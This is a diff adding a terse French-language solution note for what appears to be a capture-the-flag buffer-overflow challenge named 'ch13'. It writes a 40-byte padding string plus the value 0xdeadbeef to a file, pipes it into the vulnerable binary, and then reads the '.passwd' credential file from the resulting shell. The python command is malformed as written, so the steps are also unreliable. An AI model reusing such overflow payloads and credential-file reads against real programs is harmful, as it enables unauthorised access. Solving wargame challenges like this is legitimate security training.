@@ -1,0 +1,6 @@
+python -c print, "A"*40+"\xef\xbe\xad\xde" > /tmp/bcrespin/test
+cat /tmp/bcrespin/test - | ./ch13
+
+pendant que le process tourne
+
+cat .passwd
